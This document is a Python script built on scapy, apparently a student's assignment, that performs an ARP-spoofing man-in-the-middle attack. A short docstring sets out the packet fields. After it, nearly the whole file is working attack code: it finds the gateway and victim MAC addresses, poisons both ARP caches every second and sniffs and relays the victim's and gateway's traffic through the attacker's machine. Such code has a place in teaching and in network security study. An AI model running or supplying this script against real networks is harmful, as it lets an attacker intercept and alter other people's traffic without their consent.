"""
My name is In Sup Lee 2014400019

arp_spoofing among sender(victim), receiver(gateway), attacker

            Ethernet Header   ARP Header (scapy)
            src   dst          op    hwsrc    psrc     hwdst    pdst

infection : attMAC   sendMAC   RES   attMAC(*)recvIP   sendMAC  sendIP
relay     : attMAC   recvMAC   REQ   attMAC(*)sendIP   recvMAC  recvIP


in ARP op, who_has(request), is_at(response)

"""
#./arpspoofing 192.168.43.197(=senderIP)

from scapy.all import *
import sys
import time #for sleep
import copy #for deepcopy
from threading import Thread #for multi threading

#make and send spoofed packet for poison in loop!
#victim = sender, gateway = receiver
def infection(attMAC, vicIP, vicMAC, gateIP, gateMAC):
    while(1) :
        send(ARP(op = ARP.is_at, psrc = gateIP, pdst = vicIP, hwsrc = attMAC, hwdst = vicMAC))
        send(ARP(op = ARP.is_at, psrc = vicIP, pdst = gateIP, hwsrc = attMAC, hwdst = gateMAC))
        time.sleep(1) #infection will be made every second


def sniffandrelayFromVictim(): ##we process packets one by one
    global sendIP      
    global recvMAC
    global attMAC
    while(1) :        
        sniffedPacket = sniff(filter='host %s' % sendIP, prn = lambda x:x.summary(), count=1) # summary for test
        relayedPacket=copy.deepcopy(sniffedPacket)
        relayedPacket[0].src = attMAC #srcMAC = attMAC
        relayedPacket[0].dst = recvMAC #dstMAC = gateway MAC
        send(relayedPacket[0])
        
             

def sniffandrelayFromGateway() :
    global recvIP
    global attMAC
    global sendMAC
    while(1) :
        sniffedPacket2 = sniff(filter='host %s' % recvIP, prn = lambda x:x.summary(), count=1) # summary for test 
        relayedPacket2=copy.deepcopy(sniffedPacket2)
        relayedPacket2[0].src = attMAC
        relayedPacket2[0].dst = sendMAC        
        send(relayedPacket2[0])   


if __name__=='__main__':
    if(len(sys.argv) != 2):
        print("we use this program by like this")
        print("python %s [victim IP]" % sys.argv[0])
        exit(-1)
    
    #get IP of sender(victim)
    sendIP = sys.argv[1]

    #get IP of receiver(gateway) 
    recvIP = os.popen("route -n | grep UG | awk '{print $2}' | uniq").read()[:-1]

    #get MAC of receiver(gateway)
    res = sr(ARP(op=ARP.who_has, pdst = recvIP), timeout = 5, chainCC=True)
    recvMAC = res[0][0][1].hwsrc

    #get MAC of sender(victim) after get gateway IP
    res = sr(ARP(op=ARP.who_has, pdst = sendIP), timeout = 5, chainCC=True)
    sendMAC = res[0][0][1].hwsrc

    #get MAC of attacker
    #eth0 is replaced by ens33 in ubuntu 16.04
    attMAC = os.popen("ifconfig | grep ens33 | awk '{print $5}' | uniq").read()[:-1]

    
        
    infectionSession = Thread(target = infection, args=(attMAC, sendIP, sendMAC, recvIP, recvMAC))
    infectionSession.start()

    vicSpoofSession = Thread(target = sniffandrelayFromVictim)
    vicSpoofSession.start()

    sniffandrelayFromGateway()
        

  


  











    

    




